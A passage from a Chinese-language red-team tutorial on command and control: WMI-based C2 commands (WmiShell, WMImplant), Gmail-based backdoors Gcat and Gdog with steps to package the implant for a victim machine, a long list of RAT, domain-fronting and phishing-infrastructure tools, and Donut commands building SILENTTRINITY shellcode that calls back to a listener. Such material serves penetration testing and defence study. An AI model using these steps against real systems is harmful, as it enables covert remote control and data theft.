-   读取文件和注册表项
-   文件系统审查
-   windows 事件审查
红队可以利用 WMI 的功能以及它可以用于各种 Windows
系统的事实，以便执行主机侦察，命令执行，执行横向移动和维持会话持久性。
WMI 服务使用DCOM（TCP 端口 135）或WinRM 协议（SOAP - 端口5985）。
它以 SYSTEM 权限运行，而且需要管理员凭据。自 2014
年以来，公开存在各种工具，可通过 WMI 用作命令和控制。
WmiShell 是一个PowerShell 脚本，它是
[WmiSploit](https://github.com/secabstraction/WmiSploit) 的一部分。
> Enter-WmiShell -ComputerName desktop-1st179m -UserName netbiosX
![](media/image376.jpeg){width="5.8633781714785655in"
height="2.1141666666666667in"}
WmiSploit 还包含一个脚本，该脚本可以使用 WMI
作为通信通道在远程目标上执行 PowerShell 命令和脚本。
> Invoke-WmiCommand -ComputerName desktop-1st179m -ScriptBlock
> {tasklist}
WMImplant
Chris Truncer 开发了
[WMImplant](https://github.com/FortyNorthSecurity/WMImplant)
，这是一个利用 WMI 进行攻击性操作的PowerShell 工具。它可以用作 C2
工具，其优点是不需要将客户端程序放在目标上，但是需要管理员凭据。
> Import-Module .\\WMImplant.ps1 Invoke-WMImplant
WMimplant 的功能一旦执行就可以在主菜单中找到。 它可以执行文件传输操作，
横向移动和主机侦察。
> 在执行任何其他命令之前，需要先执行 change_user
> 命令，以便为远程连接提供正确的凭据。
![](media/image377.jpeg){width="5.787023184601924in"
height="2.863748906386702in"}
在目标机器上执行系统命令：
![](media/image378.jpeg){width="5.788461286089239in" height="3.1175in"}
####### 标准加密协议 {#标准加密协议-1}
攻击者可以直接使用已知的加密算法来隐藏命令和控制的流量，而不是依赖于通信协议提供的任何内在保护。尽管使用了安全算法，但如果一些必要的密钥被编码或保存在恶意病毒样本、配置文件中，则安全性可能易受逆向工程的影响。
####### 标准非应用层加密
> 使用标准的非应用层协议进行主机与C2
> 服务器之间或网络中受感染主机之间的通信。可能的协议列表很广泛。具体示例包括使用网络层协议，如：网际控制报文协议（ICMP）；传输层协议，如：用户数据报协议（UDP）；会话层协议，如：
> Socket Secure（SOCKS）以及重定向 /隧道协议，例如 Serial over LAN
（SOL）。
主机之间的 ICMP 通信就是一个例子。由于 ICMP 是 Internet 协议套件的一部
分，因此需要所有与 IP 兼容的主机实现；但是，它不像其它因特网协议（如TCP
或UDP）那样受到监视，并且可能被攻击者用来隐藏通信。
####### 非常用端口
攻击者可以通过非标准端口与C2
服务器进行通信，从而绕过未正确配置的代理和防火墙。
####### 网络服务
攻击者可以使用现有的合法外部Web 服务作为将命令中继到目标系统的一种方法。
这些命令还包括指向命令和控制（C2）基础结构的指针。攻击者会将内容（称为死区解析程序）发布到具有嵌入式（通常是模糊/编码）域或IP
地址的Web 服务上。一旦被感染，受害者将接触并被这些解析器重定向。
流行网站和社交媒体可能会作为C2
提供一定的保障，因为网络中的主机可能已经在感染之前与他们通信。使用常见服务（例如Google
或Twitter 提供的服务）可以让对手更容易隐藏在预期的噪声数据中。Web
服务提供商通常使用SSL/TLS 加密，为攻击者提供更高级别的保护。
使用Web 服务还可以保护后端C2
基础架构免受恶意软件二进制分析的发现，同时还可以实现操作弹性（因为此基础架构可能会动态更改）。
##### 实践
###### C2withgmail
Gmail 为用户和企业提供电子邮件功能。这意味着大多数组织中的 Gmail
服务器流量是允许放行的。红队操作需要尽可能隐蔽，因此使用 ICMP 和 SMTP
等合法协议来执行命令到受感染的主机是必不可少的。为此，Web Gcat 和 Gdog
上有两个重要的工具，它们都可以使用Gmail 作为命令和控制服务器。
gcat
[Gcat](https://github.com/byt3bl33d3r/gcat) 是基于 python 的框架，它使用
Gmail 来作为 C2 服务器。Gcat 程序将定期检查 Gmail
收件箱，查看是否有任何带有活动 ID
的新消息。如果有，这些电子邮件中包含的命令将在受感染的主机上执行，当收到新的响应消息时，该信息将传递给
Gcat 的控制台。
为了允许 Gcat 与 Gmail 通信，需要启用以下设置。
-   打 开 允 许 安 全 性 较 低 的 应 用 ， 设 置 地 址 ：
![](media/image379.jpeg){width="5.801067366579177in"
height="1.8004166666666668in"}
-   在 Gmail 帐户设置中启用 IMAP
    设置，设置地址[https://mail.google.com/mail/u/0/#settings/fwdandpop](https://mail.google.com/mail/u/0/%23settings/fwdandpop)
![](media/image380.jpeg){width="5.824683945756781in"
height="5.044791119860018in"}
下一步是将 implant.py
文件转换为可执行文件。有多种方法可以实现，但最简单的方法是创建一个
setup.py 文件，其中包含以下代码并使用 py2exe。
> from distutils.core import setup import py2exe
>
> setup(console=\[\'implant.py\'\])
用 python 运行上述代码：
> python2 setup.py py2exe
>
> 同时，修改 gcat.py 中对应 gmail 的用户名和密码。
![](media/image381.jpeg){width="5.835406824146982in"
height="1.172082239720035in"}
当生成的 exe 成功在受害者机器上运行时，攻击者就可以通过 gmail 发送命令。
![](media/image382.jpeg){width="5.850346675415573in"
height="1.0029155730533683in"}
gdog
[gdog](https://github.com/maldevel/gdog) 和 gcat
原理相同，但是它的功能比 gcat 更加强大。gdog 同样需要配置
允许安全性较低的应用、启用 IMAP gdog 的特点:
> 通信数据加密（AES）+ SHA256 哈希
>
> 使用系统信息生成唯一的id（SHA256 哈希） Job IDs 是随机的SHA256 哈希
>
> 获取系统信息
>
> 获取地理信息（城市，国家，经度，纬度 等等）
>
> 获取运行的进程、服务、用户、设备（硬件） 获取客户端列表
>
> 执行系统命令
>
> 从客户端下载文件上传文件至客户端执行 shellcode
>
> 截屏
>
> 锁定客户端屏幕键盘记录
>
> 关闭或重启远程计算机注销当前用户
>
> 从WEB 下载文件访问网站
>
> 给用户弹消息框
打包客户端的方式与 gcat 相同，在此不做赘述。
## 常用工具 {#常用工具-1}
####### 远程访问工具 {#远程访问工具}
Cobalt Strike：一款非常优秀的后渗透平台。https://cobaltstrike.com/
Empire：一个纯粹的PowerShell
后期漏洞利用代理工具。https://github.com/EmpireProject/Empire
Metasploit
Framework：一个软件漏洞利用框架。https://github.com/rapid7/metasploit-framework
Pupy：是一个基于python 的开源跨平台（Windows，Linux，OSX，Android）
远程管理和后期利用工具。https://github.com/n1nj4sec/pupy
Koadic：DEFCON 上的一个后渗透工具，一款js/vbs
远控，模块也蛮多的，涉及的功能也很全面。https://github.com/zerosum0x0/koadic
PoshC2：一款基于PowerShell
和C#的命令控制工具。https://github.com/nettitude/PoshC2
Gcat：是一款使用Gmail 控制管理的Python
隐形后门。https://github.com/byt3bl33d3r/gcat
TrevorC2：是一个合法的网站（可浏览），用于隐藏命令执行的客户端/服务器通信。https://github.com/trustedsec/trevorc2
Merlin：是一个用Go 语言编写的跨平台后期利用HTTP/2
命令与控制服务器和代理（ agent ）。https://github.com/Ne0nd0g/merlin
Quasar：一个用C#编码的快速轻量级远程管理工具。https://github.com/quasar/QuasarRAT
####### Staging
Red Baron：是Terraform
的一组模块和定制/第三方提供商，它试图为红队自动创建弹性，一次性，安全和灵活的基础架构。https://github.com/Coalfire-
Research/Red-Baron
EvilURL：为IDN 同形异义字攻击生成unicode
域名并检测它们。https://github.com/UndeadSec/EvilURL
Domain Hunter：检查过期域名，bluecoat 分类和Archive.org
历史记录，以确定最为适合于钓鱼和C2
的域名。https://github.com/threatexpress/domainhunter
PowerDNS：一个简单的PoC，用于演示如何使用DNS 执行PowerShell
脚本。https://github.com/mdsecactivebreach/PowerDNS
Chameleon：帮助红队将其基础架构分类为任意类别的工具。https://github.com/mdsecactivebreach/Chameleon
CatMyFish：搜索分类域。 为你的Cobalt Strike beacon C&C
设置白名单域。https://github.com/Mr-Un1k0d3r/CatMyFish
Malleable C2：用于重新定义Beacon
通信中的指标。https://github.com/rsmudge/Malleable-C2-Profiles
Malleable-C2-Randomizer：该脚本通过使用元语言随机化Cobalt Strike
Malleable C2
配置文件，从而最大程度上的减少基于签名的检测控制机会。https://github.com/bluscreenofjeff/Malleable-C2-Randomizer
FindFrontableDomains：搜索潜在的frontable
域。https://github.com/rvrsh3ll/FindFrontableDomains
Postfix-Server-Setup：自动化建立一个网络钓鱼服务器。https://github.com/n0pe-sled/Postfix-Server-Setup
DomainFronting：根据CDN 列出Domain Frontable
域列表。https://github.com/vysec/DomainFrontingLists
> Apache2-Modrewrite-Setup：快速在你的基础架构中实现Modrewrite。
> https://github.com/n0pe-sled/Apache2-Mod-Rewrite-Setup
mod_rewrite：沙箱逃逸。https://gist.github.com/curi0usJack/971385e8334e189d93a6cb4671238b10
> externalc2framework：允许我们使用beacon数据包并通过可选端口与Team
> Server进行交互。https://github.com/Und3rf10w/externalc2_framework
ExternalC2：一个用于将通信渠道与Cobalt Strike External C2
服务器集成的库。https://github.com/ryhanson/ExternalC2
> cs2 modrewrite：用于将CobaltStrike配置文件转换为modrewrite 脚本的工
> 具。https://github.com/threatexpress/cs2modrewrite
e2modrewrite：用于将Empire 配置文件转换为Apache modrewrite
脚本。https://github.com/infosecn1nja/e2modrewrite
Domain Fronting Google App
Engine：一个云平台，允许用户构建和部署自制的Web 和
移动应用程序，它相当于一个介于应用程序和云基础设施之间的抽象层。https://github.com/redteam-cyberark/Google-Domain-fronting
使用NGINX
提供随机Payload。https://gist.github.com/jivoi/a33ace2e25515a31aa2ffbae246d98c9
Empire 自动任务执行。https://github.com/bneg/RedTeam-Automation
meek：Tor 的一种传输插件，它将数据流编码为一系列HTTPS
请求和响应。https://github.com/arlolra/meek
CobaltStrike-ToolKit ：一些实用的obaltStrike
脚本。https://github.com/killswitch-GUI/CobaltStrike-ToolKit
## 案例 {#案例-1}
命令和控制策略表示攻击者如何与目标网络内的其控制下的系统进行通信。根据系统配置和网络拓扑，攻击者可以通过多种方式建立具有各种隐蔽级别的命令和控
制。由于网络级别对手可以获得的广泛变化，只有最常见的因素被用来描述命令和控制的差异。在所记录的方法中仍然有许多特定的技术，主要是由于定义新协议和使用现有的合法协议和网络服务进行通信是多么容易。
由此产生的细分应该有助于传达这样一个概念，即在没有先验知识的情况下通过命令和控制协议检测入侵是长期的困难主张。攻击者在网络级防御避免方面的主要限制因素是测试和部署工具，以快速更改其协议，了解现有防御技术以及访问合法的Web
服务，这些服务在适当使用时，难以将其工具与良性流量区分开来。
## SILENTTRINITY & DONUT
https://thewover.github.io/Introducing-Donut/
https://github.com/TheWover/donut/
https://github.com/TheWover/donut/releases/tag/v0.9
https://github.com/byt3bl33d3r/SILENTTRINITY
> .\\donut.exe -a 1 -f .\\SILENTTRINITY_DLL.dll -c ST -m Main -p
> [http://192.168.10.1](http://192.168.10.1/) 25:80
>
> .\\donut.exe -a 2 -f .\\SILENTTRINITY_DLL.dll -c ST -m Main -p
> [http://192.168.10.1](http://192.168.10.1/) 25:80
>
> \$filename=\"C:\\Users\\demon\\Desktop\\payload.bin\"
> \[convert\]::ToBase64String(\[IO.File\]::ReadAllBytes(\$filename)) \|
> clip
>
> ![](media/image383.png)[e Ser
> ver](https://demonsec666.oss-cn-qingdao.aliyuncs.com/CD15D3B049938642D012504E1A16285C.jpg)
> --- [Pytlion • s
> udo](https://demonsec666.oss-cn-qingdao.aliyuncs.com/CD15D3B049938642D012504E1A16285C.jpg)
> ---[105,
> 30](https://demonsec666.oss-cn-qingdao.aliyuncs.com/CD15D3B049938642D012504E1A16285C.jpg)
![](media/image384.png){width="5.865637576552931in" height="6.355in"}
\*内含视频内容\*\*:https://[www.ggsec.cn/donut.html](http://www.ggsec.cn/donut.html)
## wikipedia-c2